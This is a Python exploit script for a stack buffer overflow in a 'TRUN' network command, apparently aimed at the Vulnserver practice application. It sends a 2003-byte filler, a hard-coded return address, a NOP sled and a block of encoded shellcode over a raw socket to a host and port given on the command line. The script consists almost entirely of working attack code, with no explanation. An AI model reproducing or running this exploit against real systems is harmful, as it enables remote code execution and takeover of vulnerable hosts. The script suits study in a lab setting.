#!/usr/bin/python3
import sys, socket, pdb

target = sys.argv[1]
targetport = int(sys.argv[2])

if len(sys.argv) != 3:
    print('Usage: "' + sys.argv[0] + ' 0.0.0.0 21"')
    sys.exit()


overflow = (
b"\xda\xd9\xbd\x20\xdc\x63\x01\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
b"\x52\x83\xc0\x04\x31\x68\x13\x03\x48\xcf\x81\xf4\x74\x07\xc7"
b"\xf7\x84\xd8\xa8\x7e\x61\xe9\xe8\xe5\xe2\x5a\xd9\x6e\xa6\x56"
b"\x92\x23\x52\xec\xd6\xeb\x55\x45\x5c\xca\x58\x56\xcd\x2e\xfb"
b"\xd4\x0c\x63\xdb\xe5\xde\x76\x1a\x21\x02\x7a\x4e\xfa\x48\x29"
b"\x7e\x8f\x05\xf2\xf5\xc3\x88\x72\xea\x94\xab\x53\xbd\xaf\xf5"
b"\x73\x3c\x63\x8e\x3d\x26\x60\xab\xf4\xdd\x52\x47\x07\x37\xab"
b"\xa8\xa4\x76\x03\x5b\xb4\xbf\xa4\x84\xc3\xc9\xd6\x39\xd4\x0e"
b"\xa4\xe5\x51\x94\x0e\x6d\xc1\x70\xae\xa2\x94\xf3\xbc\x0f\xd2"
b"\x5b\xa1\x8e\x37\xd0\xdd\x1b\xb6\x36\x54\x5f\x9d\x92\x3c\x3b"
b"\xbc\x83\x98\xea\xc1\xd3\x42\x52\x64\x98\x6f\x87\x15\xc3\xe7"
b"\x64\x14\xfb\xf7\xe2\x2f\x88\xc5\xad\x9b\x06\x66\x25\x02\xd1"
b"\x89\x1c\xf2\x4d\x74\x9f\x03\x44\xb3\xcb\x53\xfe\x12\x74\x38"
b"\xfe\x9b\xa1\xef\xae\x33\x1a\x50\x1e\xf4\xca\x38\x74\xfb\x35"
b"\x58\x77\xd1\x5d\xf3\x82\xb2\x6b\x04\x8c\x76\x04\x06\x8c\x67"
b"\x88\x8f\x6a\xed\x20\xc6\x25\x9a\xd9\x43\xbd\x3b\x25\x5e\xb8"
b"\x7c\xad\x6d\x3d\x32\x46\x1b\x2d\xa3\xa6\x56\x0f\x62\xb8\x4c"
b"\x27\xe8\x2b\x0b\xb7\x67\x50\x84\xe0\x20\xa6\xdd\x64\xdd\x91"
b"\x77\x9a\x1c\x47\xbf\x1e\xfb\xb4\x3e\x9f\x8e\x81\x64\x8f\x56"
b"\x09\x21\xfb\x06\x5c\xff\x55\xe1\x36\xb1\x0f\xbb\xe5\x1b\xc7"
b"\x3a\xc6\x9b\x91\x42\x03\x6a\x7d\xf2\xfa\x2b\x82\x3b\x6b\xbc"
b"\xfb\x21\x0b\x43\xd6\xe1\x2b\xa6\xf2\x1f\xc4\x7f\x97\x9d\x89"
b"\x7f\x42\xe1\xb7\x03\x66\x9a\x43\x1b\x03\x9f\x08\x9b\xf8\xed"
b"\x01\x4e\xfe\x42\x21\x5b")


buffer = b'A' * 2003
buffer += b'\xaf\x11\x50\x62'
buffer += b"\x90" * 32
buffer += overflow

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target, targetport))
s.send(b'TRUN /.:/' + buffer)
s.close()
